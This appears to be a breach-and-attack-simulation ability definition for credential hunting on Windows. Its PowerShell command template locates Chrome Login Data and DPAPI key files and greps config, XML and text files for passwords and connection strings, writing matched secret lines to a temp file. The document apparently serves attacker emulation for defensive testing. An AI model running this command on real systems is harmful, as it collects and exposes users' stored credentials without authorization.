ability.name: DPAPI / Browser & Configuration Credential Hunt
ability.description: Searches files and profile directories for cached credentials, DPAPI keys, and Chrome databases.

stages.stage_name: Audit DPAPI, browser directories, and configurations
stages.command_template: $d='C:\\Windows\\Temp\\bas\\cred_access'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { $results = @(); $chromePath = \"$env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\"; if (Test-Path $chromePath) { $results += \"Found Chrome Login Data at: $chromePath\" }; $dpapiPath = \"$env:APPDATA\\Microsoft\\Protect\"; if (Test-Path $dpapiPath) { $results += \"Found DPAPI folders at: $dpapiPath\"; Get-ChildItem -Path $dpapiPath -Recurse -File -ErrorAction SilentlyContinue | foreach { $results += \"DPAPI: $($_.FullName)\" } }; $searchDirs = @(\"C:\\inetpub\", \"C:\\Windows\\Panther\", \"$env:USERPROFILE\\Documents\"); foreach ($dir in $searchDirs) { if (Test-Path $dir) { $files = Get-ChildItem -Path $dir -Recurse -Include *.config,*.xml,*.txt,*.ini -ErrorAction SilentlyContinue | Select-String -Pattern \"password\",\"passwd\",\"connectionString\",\"credentials\" -ErrorAction SilentlyContinue; foreach ($match in $files) { $results += \"Found potential credential in file: $($match.Path) Line: $($match.LineNumber) - $($match.Line)\" } } }; if ($results.Count -eq 0) { $results += \"No potential credentials or DPAPI/browser secrets detected in audited paths\" }; $results -join [char]13+[char]10 } catch { \"ERROR: $_\" }) | Tee-Object -FilePath $d\\dpapi_browser.txt

rationale: Triage and extract configuration secrets, Chrome credentials, and DPAPI structures.
